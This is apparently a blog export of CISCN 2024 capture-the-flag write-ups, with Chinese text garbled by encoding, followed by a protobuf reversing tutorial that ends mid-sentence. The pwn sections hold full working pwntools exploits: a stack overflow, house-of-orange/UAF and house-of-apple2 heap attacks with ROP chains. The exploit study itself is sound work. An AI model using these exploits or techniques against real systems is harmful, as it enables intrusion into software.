[{"content":"PWN gostack é¢˜ç›®ç®€ä»‹ libc: 2.35\nexploit point: stack overflow\ngolangç¼–å†™çš„ä¸€é“æ ˆé¢˜ï¼Œæœ‰ä¸€ä¸ªæ— é™åˆ¶çš„è¾“å…¥ï¼Œé€šè¿‡gdbåŠ¨è°ƒæ‰¾å‡ºåç§»é‡ï¼Œè¦†ç›–retåœ°å€ä¸ºmain_main2ï¼Œå¼€å¯ä¸€ä¸ªbash\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * binary_path = \u0026#39;./gostack\u0026#39; libc_path = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) elf = ELF(binary_path) libc = ELF(libc_path) p=remote(\u0026#39;8.147.128.251\u0026#39;,30914) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\u0026#34;__free_hook\u0026#34;] def debug(): gdb.attach(p) pause() def pwn(): payload = b\u0026#34;a\u0026#34;*256 + p64(0X4a05a0) + p64(101) payload = payload.ljust(464,b\u0026#34;a\u0026#34;) + p64(0X4a05a0) #print(payload) p.sendline(payload) p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: pwn() orange_cat_diary é¢˜ç›®ç®€ä»‹ libc: 2.23\nexploit point: UAF\nä¼ ç»Ÿèœå•å †é¢˜ï¼Œlibc2.23ï¼ŒUAFæ¼æ´ï¼Œæœ‰ä¸€æ¬¡freeå’Œä¸€æ¬¡showï¼Œæˆ‘ä»¬åˆè¦æ³„éœ²libcåˆè¦æ‰“ä¸€æ¬¡UAFï¼Œæ˜æ˜¾ä¸€æ¬¡freeæ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥é€‰æ‹©æ‰“ä¸€æ¬¡house of orangeï¼ˆå‘¼åº”ä¸Šäº†ï¼‰ï¼Œç„¶åUAFæ‰“malloc_hook\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 from pwn import * binary_path = \u0026#39;./orange_cat_diary\u0026#39; libc_path = \u0026#34;./libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) elf = ELF(binary_path) libc = ELF(libc_path) argv = f\u0026#39;\u0026#39; #p=process(argv=[binary_path, argv]) p=remote(\u0026#39;8.147.129.254\u0026#39;,12519) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 def debug(): gdb.attach(p) pause() def cmd(idx): p.sendlineafter(b\u0026#34;Please input your choice:\u0026#34;,str(idx)) def add(size,content): cmd(1) p.sendlineafter(b\u0026#34;Please input the length of the diary content:\u0026#34;,str(size)) p.sendlineafter(b\u0026#34;Please enter the diary content:\u0026#34;,content) def show(): cmd(2) def free(): cmd(3) def edit(size,content): cmd(4) p.sendlineafter(b\u0026#34;Please input the length of the diary content:\u0026#34;,str(size)) p.sendlineafter(b\u0026#34;Please enter the diary content:\\n\u0026#34;,content) def welcome(name): p.sendlineafter(b\u0026#34;Hello, I\u0026#39;m delighted to meet you. Please tell me your name.\\n\u0026#34;,name) def pwn(): #debug() welcome(b\u0026#34;y4ng\u0026#34;) add(0x18,b\u0026#34;aaaa\u0026#34;) edit(0x20,b\u0026#34;b\u0026#34;*0x18+b\u0026#34;\\xE1\\x0f\\x00\\x00\\x00\\x00\\x00\\x00\u0026#34;) add(0x1000,b\u0026#34;y4ng\u0026#34;) add(0x60,b\u0026#34;\u0026#34;) show() libc_addr = u64(p.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;))-0x3c510a leak_addr(\u0026#34;libc_addr\u0026#34;,libc_addr ) malloc_hook = libc_addr + libc.sym[\u0026#34;__malloc_hook\u0026#34;]-0x23 one = libc_addr+0xf03a4 free() edit(0x10,p64(malloc_hook)) add(0x60,b\u0026#34;a\u0026#34;) add(0x60,b\u0026#34;a\u0026#34;*0x13+p64(one)) cmd(1) p.sendlineafter(b\u0026#34;Please input the length of the diary content:\u0026#34;,str(0x20)) p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: pwn() ezheap æ€ä¹ˆæ˜¯ç”¨seccompå¼€çš„æ²™ç®±å•Šï¼Œä¸‹æ¬¡è®°å¾—ç”¨prctlæ‰ä¸ä¼šæœ‰è¿™ä¹ˆå¤šé‡Šæ”¾çš„heapå†…å­˜ï¼Œæ¨èæ–‡ç« seccompæ²™ç®±\né¢˜ç›®ç®€ä»‹ libc: 2.35\nexploit point: heap overflow\nå€ŸåŠ©ç©ºé—´ä¸­ç°å­˜çš„heapï¼Œæ³„éœ²å‡ºlibcå’Œheapåœ°å€ï¼Œç„¶åæ‰“house of apple2\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 from pwn import * binary_path = \u0026#39;./EzHeap\u0026#39; libc_path = \u0026#34;./libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) elf = ELF(binary_path) libc = ELF(libc_path) argv = f\u0026#39;\u0026#39; p=process(argv=[binary_path, argv]) #p=remote(\u0026#39;8.147.129.121\u0026#39;,15268) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\u0026#34;__free_hook\u0026#34;] def debug(): gdb.attach(p,\u0026#34;b _IO_wdoallocbuf\u0026#34;) pause() def cmd(idx): p.sendlineafter(b\u0026#34;choice \u0026gt;\u0026gt; \u0026#34;,str(idx)) def add(size,content): cmd(1) p.sendlineafter(b\u0026#34;size:\u0026#34;,str(size)) p.sendlineafter(b\u0026#34;content:\u0026#34;,content) def free(idx_): cmd(2) p.sendlineafter(b\u0026#34;idx\u0026#34;,str(idx_)) def edit(idx,size,content): cmd(3) p.sendlineafter(b\u0026#34;idx\u0026#34;,str(idx)) p.sendlineafter(b\u0026#34;size:\u0026#34;,str(size)) p.sendlineafter(b\u0026#34;content:\u0026#34;,content) def show(idx): cmd(4) p.sendlineafter(b\u0026#34;idx\u0026#34;,str(idx)) p.recvuntil(b\u0026#34;content:\u0026#34;) def pwn(): add(0x50,b\u0026#34;y4ng\u0026#34;) #0 add(0x50,b\u0026#34;y4ng\u0026#34;) #1 edit(1,0x60,b\u0026#34;a\u0026#34;*8*12) show(1) p.recvuntil(b\u0026#34;a\u0026#34;*8*12) libc_addr = u64(p.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;)) - 0x21ace0 leak_addr(\u0026#34;libc_addr\u0026#34;,libc_addr) edit(1,0x60,b\u0026#34;a\u0026#34;*8*11+p64(0x90)) for i in range(7): add(0x30,b\u0026#34;y4ng\u0026#34;) #2-8 add(0x30,b\u0026#34;y4ng\u0026#34;) #9 add(0x30,b\u0026#34;y4ng\u0026#34;) #10 edit(10,0x41,b\u0026#34;a\u0026#34;*8*8+b\u0026#34;a\u0026#34;) show(10) p.recvuntil(b\u0026#34;a\u0026#34;*8*8) heap_base = u64(p.recv(6).ljust(8,b\u0026#34;\\x00\u0026#34;))- 0x61 edit(10,0x48,b\u0026#34;a\u0026#34;*8*6+p64(0)+p64(0xf1)+p64(heap_base)) heap_base += 0x1590 #debug() pop_rdi_ret = libc_addr + 0x000000000002a3e5 pop_rsi_ret = libc_addr + 0x000000000002be51 pop_rsi_r15_ret = libc_addr + 0x000000000002a3e3 pop_rdx_r12_ret = libc_addr + 0x000000000011f2e7 pop_rax_ret = libc_addr + 0x0000000000045eb0 magic_gadget = libc_addr + 26 + 0x16a050 \u0026#39;\u0026#39;\u0026#39; mov rbp,QWORD PTR [rdi+0x48] mov rax,QWORD PTR [rbp+0x18] lea r13,[rbp+0x10] mov DWORD PTR [rbp+0x10],0x0 mov rdi,r13 call QWORD PTR [rax+0x28] \u0026#39;\u0026#39;\u0026#39; leave_ret = libc_addr + 0x000000000004da83 syscall_ret = libc_addr + libc.sym[\u0026#39;read\u0026#39;] + 0x10 ret = libc_addr + 0x0000000000029139 fake_IO_addr = heap_base + 0x180 leak_addr(\u0026#34;fake_IO_addr\u0026#34;,fake_IO_addr) rop_address = fake_IO_addr + 0xe0 + 0xe8 + 0x70 orw_rop = b\u0026#39;./flag\\x00\\x00\u0026#39; orw_rop += p64(pop_rsi_r15_ret) + p64(0) + p64(fake_IO_addr - 0x10) orw_rop += p64(pop_rdi_ret) + p64(rop_address) #orw_rop += p64(pop_rsi_ret) + p64(0) orw_rop += p64(pop_rax_ret) + p64(2) orw_rop += p64(syscall_ret) orw_rop += p64(pop_rdi_ret) + p64(3) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc.sym[\u0026#39;read\u0026#39;]+libc_addr) orw_rop += p64(pop_rdi_ret) + p64(1) orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100) orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0) orw_rop += p64(libc.sym[\u0026#39;write\u0026#39;]+libc_addr) payload = p64(0) + p64(leave_ret) + p64(0) + p64(libc.sym[\u0026#39;_IO_list_all\u0026#39;] - 0x20 + libc_addr) payload = payload.ljust(0x38, b\u0026#39;\\x00\u0026#39;) + p64(rop_address) payload = payload.ljust(0x90, b\u0026#39;\\x00\u0026#39;) + p64(fake_IO_addr + 0xe0) payload = payload.ljust(0xc8, b\u0026#39;\\x00\u0026#39;) + p64(libc.sym[\u0026#39;_IO_wfile_jumps\u0026#39;]+libc_addr) payload = payload.ljust(0xd0 + 0xe0, b\u0026#39;\\x00\u0026#39;) + p64(fake_IO_addr + 0xe0 + 0xe8) payload = payload.ljust(0xd0 + 0xe8 + 0x68, b\u0026#39;\\x00\u0026#39;) + p64(magic_gadget) payload += orw_rop leak_addr(\u0026#34;heap_base\u0026#34;,heap_base) add(0x100,b\u0026#34;a\u0026#34;) # 11 add(0x450,b\u0026#34;y4ng\u0026#34;) # 12 add(0x450,b\u0026#34;y4ng\u0026#34;) # 13 add(0x440,b\u0026#34;y4ng\u0026#34;) # 14 add(0x440,b\u0026#34;y4ng\u0026#34;) # 15 free(12) add(0x500,b\u0026#34;y4ng\u0026#34;) # 12 free(14) p1 = b\u0026#34;a\u0026#34;*0x100+p64(0)+p64(0x461)+payload edit(11,len(p1),p1) add(0x500,b\u0026#34;y4ng\u0026#34;) add(0x440,b\u0026#34;y4ng\u0026#34;) # 15 cmd(5) p.interactive() if __name__ == \u0026#34;__main__\u0026#34;: pwn() crypto å·¥ä¸šä¿¡æ¯ ä¸€é“å¯ä¿¡è®¡ç®—é¢˜ï¼Œå­—å¤ªå¤šäº†è®©GPTå¸®æˆ‘è¯»æ–‡æ¡£ï¼Œæ ¹æ®ä»–ç»™çš„ä»£ç ä¿®æ”¹record.listå’Œå‡½æ•°\nrecord.list 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 { \u0026#34;type\u0026#34;: \u0026#34;MAC_LABEL\u0026#34;, \u0026#34;subtype\u0026#34;: \u0026#34;RECORD\u0026#34; } { \u0026#34;name\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;ID\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;department\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;position\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;YOF\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 0, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 1, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;salary\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 1, \u0026#34;isselfdefine\u0026#34;: 1, \u0026#34;class\u0026#34;: \u0026#34;F\u0026#34;, \u0026#34;level_fix\u0026#34;: 0, \u0026#34;level_adjust\u0026#34;: 0 } { \u0026#34;name\u0026#34;: \u0026#34;cell\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 1, \u0026#34;isselfdefine\u0026#34;: 0, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 0, \u0026#34;level_adjust\u0026#34;: -1 } { \u0026#34;name\u0026#34;: \u0026#34;email\u0026#34;, \u0026#34;isleveladjust\u0026#34;: 1, \u0026#34;isselfdefine\u0026#34;: 0, \u0026#34;class\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;level_fix\u0026#34;: 0, \u0026#34;level_adjust\u0026#34;: -2 } fuction 1 2 3 4 5 6 7 // add except rule check here if (strcmp(record_name, \u0026#34;salary\u0026#34;) == 0) { // åˆ¤æ–­æ˜¯å¦æ˜¯æœ¬äººæŸ¥è¯¢ if (strcmp(read_user, record_user) == 0) { return 1; // å…è®¸è®¿é—® } } ","permalink":"https://www.y4ng.cn/posts/writeups/ciscn_2024/","summary":"PWN gostack é¢˜ç›®ç®€ä»‹ libc: 2.35\nexploit point: stack overflow\ngolangç¼–å†™çš„ä¸€é“æ ˆé¢˜ï¼Œæœ‰ä¸€ä¸ªæ— é™åˆ¶çš„è¾“å…¥ï¼Œé€šè¿‡gdbåŠ¨è°ƒæ‰¾å‡ºåç§»é‡ï¼Œè¦†ç›–retåœ°å€ä¸ºmain_main2ï¼Œå¼€å¯ä¸€ä¸ªbash\nexp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from pwn import * binary_path = \u0026#39;./gostack\u0026#39; libc_path = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; context(arch=\u0026#34;amd64\u0026#34;,os=\u0026#34;linux\u0026#34;,log_level=\u0026#34;debug\u0026#34;) elf = ELF(binary_path) libc = ELF(libc_path) p=remote(\u0026#39;8.147.128.251\u0026#39;,30914) leak_addr = lambda name,addr: log.success(f\u0026#39;{name}-----\u0026gt;\u0026#39;+hex(addr)) main_arena_offset = libc.symbols[\u0026#34;__malloc_hook\u0026#34;] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\u0026#34;__free_hook\u0026#34;] def debug(): gdb.","title":"CISCN_2024"},{"content":" Protobuf pwn Introduction Protocol Buffers are language-neutral, platform-neutral extensible mechanisms for serializing structured data.\ngoogleå‘æ˜çš„ä¸€ä¸ªæ•°æ®æ ¼å¼ï¼Œå¹³å°å…¼å®¹æ€§å’Œè¯­è¨€å…¼å®¹æ€§éƒ½éå¸¸å¥½ï¼Œèƒ½å¤Ÿå°†æ•°æ®ç»“æ„ä½“è½¬æ¢æˆbyteså½¢å¼å‘é€ï¼Œä¹Ÿèƒ½å°†bytesæµååºåˆ—åŒ–ä¸ºç»“æ„ä½“ï¼ˆå¯æ˜¯ğŸ‘¨é€‰æ‹©json\nInstall protobuf on Ubuntu 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # install protobuf git clone -b v3.21.0 https://github.com/protocolbuffers/protobuf.git # å¤§äº3.20éƒ½ok sudo apt-get install autoconf automake libtool curl make g++ unzip # ä¸€äº›ä¾èµ– sudo ./autogen.sh #ç”Ÿæˆé…ç½®è„šæœ¬ sudo ./configure # å¯é€‰ --prefix=path ï¼Œé»˜è®¤è·¯å¾„ä¸º/usr/local/ make -j`nproc` sudo make install sudo ldconfig # refresh shared library cache which protoc # find the location protoc --version # check # install protobuf-c git clone https://github.com/protobuf-c/protobuf-c.git ./autogen.sh \u0026amp;\u0026amp; ./configure make -j8 # å¼€nprocç»™æˆ‘å¡æ­»äº†... sudo make install ğŸ‘¨çš„åƒåœ¾è™šæ‹Ÿæœºç¼–è¯‘å®‰è£…æ˜¯çœŸçš„ä¸€å¨ğŸ’©\nTo reverse protobuf å…ˆåˆ›å»ºä¸€ä¸ªxxx.protoæ–‡ä»¶\n1 2 3 4 5 6 7 8 9 syntax=\u0026#34;proto3\u0026#34;; //proto version 2 or 3 message devicemsg{ bytes whatcon = 1; sint64 whattodo = 2; sint64 whatidx = 3; sint64 whatsize = 4; uint32 whatsthis = 5; } Cè¯­è¨€ä¸‹åˆ†æ è¾“å…¥ä»¥ä¸‹å‘½ä»¤\n1 protoc --c_out=./ devicemsg.proto \u0026ndash;c_out=./ : å°†.protoæ–‡ä»¶ä»¥Cè¯­è¨€æ ¼å¼è¾“å‡ºåœ¨å½“å‰ç›®å½•ä¸‹\nåˆ†æ.cæ–‡ä»¶\nåºåˆ—åŒ–å’Œååºåˆ—åŒ–å‡½æ•° 1 2 3 4 5 6 7 8 9 size_t devicemsg__pack (const Devicemsg *message, uint8_t *out) //åºåˆ—åŒ– { assert(message-\u0026gt;base.descriptor == \u0026amp;devicemsg__descriptor); return protobuf_c_message_pack ((const ProtobufCMessage*)message, out); } Devicemsg *devicemsg__unpack(ProtobufCAllocator *allocator, size_t len, const uint8_t *data) // ååºåˆ—åŒ– { return (Devicemsg *)protobuf_c_message_unpack(\u0026amp;devicemsg__descriptor,allocator, len, data); } ç»“æ„ä½“ä¿¡æ¯ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 static const ProtobufCFieldDescriptor devicemsg__field_descriptors[5] = { { \u0026#34;whatcon\u0026#34;, 1, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_BYTES, 0, /* quantifier_offset */ offsetof(Devicemsg, whatcon), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \u0026#34;whattodo\u0026#34;, 2, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_SINT64, 0, /* quantifier_offset */ offsetof(Devicemsg, whattodo), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \u0026#34;whatidx\u0026#34;, 3, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_SINT64, 0, /* quantifier_offset */ offsetof(Devicemsg, whatidx), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \u0026#34;whatsize\u0026#34;, 4, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_SINT64, 0, /* quantifier_offset */ offsetof(Devicemsg, whatsize), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \u0026#34;whatsthis\u0026#34;, 5, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_UINT32, 0, /* quantifier_offset */ offsetof(Devicemsg, whatsthis), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, }; static const unsigned devicemsg__field_indices_by_name[] = { 0, /* field[0] = whatcon */ 2, /* field[2] = whatidx */ 3, /* field[3] = whatsize */ 4, /* field[4] = whatsthis */ 1, /* field[1] = whattodo */ }; static const ProtobufCIntRange devicemsg__number_ranges[1 + 1] = { { 1, 0 }, { 0, 5 } }; const ProtobufCMessageDescriptor devicemsg__descriptor = { PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC, \u0026#34;devicemsg\u0026#34;, \u0026#34;Devicemsg\u0026#34;, \u0026#34;Devicemsg\u0026#34;, \u0026#34;\u0026#34;, sizeof(Devicemsg), 5, devicemsg__field_descriptors, devicemsg__field_indices_by_name, 1, devicemsg__number_ranges, (ProtobufCMessageInit) devicemsg__init, NULL,NULL,NULL /* reserved[123] */ }; å¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªç»“æ„ä½“ä¸­ï¼Œå­—æ®µä¿¡æ¯åˆ†åˆ«æ˜¯æˆå‘˜åç§°ï¼Œåºå·ç´¢å¼•ï¼Œæ ‡ç­¾ï¼Œæ•°æ®ç±»å‹ï¼Œé™å®šç¬¦å­—æ®µåç§»ï¼ˆä¿ºä¹Ÿæ²¡å¼„æ‡‚ï¼Œåç§»é‡ï¼ˆå’Œç»“æ„ä½“é¦–åœ°å€çš„ï¼‰\u0026hellip;\nç±»å‹è¡¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 typedef enum { PROTOBUF_C_TYPE_INT32, /**\u0026lt; int32 */ PROTOBUF_C_TYPE_SINT32, /**\u0026lt; signed int32 */ PROTOBUF_C_TYPE_SFIXED32, /**\u0026lt; signed int32 (4 bytes) */ PROTOBUF_C_TYPE_INT64, /**\u0026lt; int64 */ PROTOBUF_C_TYPE_SINT64, /**\u0026lt; signed int64 */ PROTOBUF_C_TYPE_SFIXED64, /**\u0026lt; signed int64 (8 bytes) */ PROTOBUF_C_TYPE_UINT32, /**\u0026lt; unsigned int32 */ PROTOBUF_C_TYPE_FIXED32, /**\u0026lt; unsigned int32 (4 bytes) */ PROTOBUF_C_TYPE_UINT64, /**\u0026lt; unsigned int64 */ PROTOBUF_C_TYPE_FIXED64, /**\u0026lt; unsigned int64 (8 bytes) */ PROTOBUF_C_TYPE_FLOAT, /**\u0026lt; float */ PROTOBUF_C_TYPE_DOUBLE, /**\u0026lt; double */ PROTOBUF_C_TYPE_BOOL, /**\u0026lt; boolean */ PROTOBUF_C_TYPE_ENUM, /**\u0026lt; enumerated type */ PROTOBUF_C_TYPE_STRING, /**\u0026lt; UTF-8 or ASCII string */ PROTOBUF_C_TYPE_BYTES, /**\u0026lt; arbitrary byte sequence */ PROTOBUF_C_TYPE_MESSAGE, /**\u0026lt; nested message */ } ProtobufCType; ä»0åˆ°0x10\næè¿°ç¬¦ç»“æ„ä½“ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 /** * Describes a message. */ struct ProtobufCMessageDescriptor { /** Magic value checked to ensure that the API is used correctly. */ uint32_t\tmagic; /** The qualified name (e.g., \u0026#34;namespace.Type\u0026#34;). */ const char\t*name; /** The unqualified name as given in the .proto file (e.g., \u0026#34;Type\u0026#34;). */ const char\t*short_name; /** Identifier used in generated C code. */ const char\t*c_name; /** The dot-separated namespace. */ const char\t*package_name; /** * Size in bytes of the C structure representing an instance of this * type of message. */ size_t\tsizeof_message; /** Number of elements in `fields`. */ unsigned\tn_fields; /** Field descriptors, sorted by tag number. */ const ProtobufCFieldDescriptor\t*fields; /** Used for looking up fields by name. */ const unsigned\t*fields_sorted_by_name; /** Number of elements in `field_ranges`. */ unsigned\tn_field_ranges; /** Used for looking up fields by id. */ const ProtobufCIntRange\t*field_ranges; /** Message initialisation function. */ ProtobufCMessageInit\tmessage_init; /** Reserved for future use. */ void\t*reserved1; /** Reserved for future use. */ void\t*reserved2; /** Reserved for future use. */ void\t*reserved3; }; important:\nmagicï¼Œä¸€èˆ¬ä¸º0x28AAEEF9 n_fieldsï¼Œå…³ç³»åˆ°åŸå§‹çš„messageç»“æ„å†…æœ‰å‡ æ¡è®°å½•ã€ fieldsï¼Œè¿™ä¸ªæŒ‡å‘messageå†…æ‰€æœ‰è®°å½•ç±»å‹ç»„æˆçš„ä¸€ä¸ªæ•°ç»„ï¼Œå¯ä»¥å€Ÿæ­¤é€†å‘åˆ†æmessageç»“æ„ã€‚ fieldç»“æ„ä½“ è¿™ä¸ªç»“æ„ä½“å°±æ˜¯ä¸Šæ–‡è¯´çš„å‚¨å­˜åç§°ï¼Œåç§»é‡çš„ï¼Œä¹Ÿæ˜¯IDAé‡Œé¢çœ‹åˆ°çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 struct ProtobufCFieldDescriptor { /** Name of the field as given in the .proto file. */ const char\t*name; /** Tag value of the field as given in the .proto file. */ uint32_t\tid; /** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */ ProtobufCLabel\tlabel; /** The type of the field. */ ProtobufCType\ttype; /** * The offset in bytes of the message\u0026#39;s C structure\u0026#39;s quantifier field * (the `has_MEMBER` field for optional members or the `n_MEMBER` field * for repeated members or the case enum for oneofs). */ unsigned\tquantifier_offset; /** * The offset in bytes into the message\u0026#39;s C structure for the member * itself. */ unsigned\toffset; /** * A type-specific descriptor. * * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the * corresponding `ProtobufCEnumDescriptor`. * * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to * the corresponding `ProtobufCMessageDescriptor`. * * Otherwise this field is NULL. */ const void\t*descriptor; /* for MESSAGE and ENUM types */ /** The default value for this field, if defined. May be NULL. */ const void\t*default_value; /** * A flag word. Zero or more of the bits defined in the * `ProtobufCFieldFlag` enum may be set. */ uint32_t\tflags; /** Reserved for future use. */ unsigned\treserved_flags; /** Reserved for future use. */ void\t*reserved2; /** Reserved for future use. */ void\t*reserved3; }; å…·ä½“ä¿¡æ¯å¯çœ‹protobuf-c\nUse protobuf with python è¾“å…¥å‘½ä»¤\n1 protoc --python_out=./ devicemsg.proto ç”Ÿæˆdevicemsg_pb2.py\næ¨¡æ¿ 1 2 3 4 5 6 7 8 import devicemsg_pb2 data = devicemsg_pb2.devicemsg() # æ–¹æ³•åç§°è·Ÿéš.protoä¸­ç»“æ„ä½“åç§°å˜åŒ– data.whattodo = todo data.whatcon = content data.whatidx = idx data.whatsize = size data.whatsthis = this data.SerializeToString() # è½¬æ¢æˆbytes CISCN 2024 ezbuf ğŸ‘¨åšè¿™é¢˜çš„æ—¶å€™ç”šè‡³ä¸çŸ¥é“protobufæ˜¯ä»€ä¹ˆ\næ¢å¤ç»“æ„ä½“ å…³é”®ç»“æ„ä½“åœ¨è¿™ï¼Œ1ä»£è¡¨åºå·1ï¼Œ3ä»£è¡¨labelï¼Œ0XFä»£è¡¨ç±»å‹ï¼ŒæŸ¥è¡¨å³å¯\næ ¹æ®ä»¥ä¸Šå­—æ®µæ¢å¤å‡ºprotobufç»“æ„ä½“\n1 2 3 4 5 6 7 8 9 syntax=\u0026#34;proto3\u0026#34;; message devicemsg{ bytes whatcon = 1; sint64 whattodo = 2; sint64 whatidx = 3; sint64 whatsize = 4; uint32 whatsthis = 5; } ä»£ç åˆ†æ å…¥å£ åç§»å’Œ.data.rel.roä¸­çš„ç¬¬äº”ä¸ªå­—æ®µæ­£å¥½å¯¹åº”ä¸Š,é™¤äº†v4+32\nä»a2-a6åˆ†åˆ«æ˜¯ï¼Œcontent todo idx size this\nèœå• å‡½æ•°0æ˜¯ä»€ä¹ˆéƒ½ä¸å¹²ï¼Œçº¯è§£ææˆ‘ä»¬å‘åŒ…çš„æ•°æ®ï¼Œä½†æ˜¯ä¼šæ ¹æ®æ•°æ®é•¿åº¦åˆ†é…å¯¹åº”å †ï¼Œå¦‚func0(str) \u0026ndash;\u0026gt; malloc(len(str))\nå‡½æ•°1æ˜¯ç”³è¯·0x30çš„chunkï¼Œç„¶åcopyæ•°æ®è¿›å»\nå‡½æ•°2æ˜¯freeï¼Œé‡Œé¢æœ‰UAF\nå‡½æ•°3æ˜¯æ‰“å°æˆ‘ä»¬ç”³è¯·chunkçš„æ•°æ®ï¼Œè¶…è¿‡ä¸¤æ¬¡å…³é—­æ 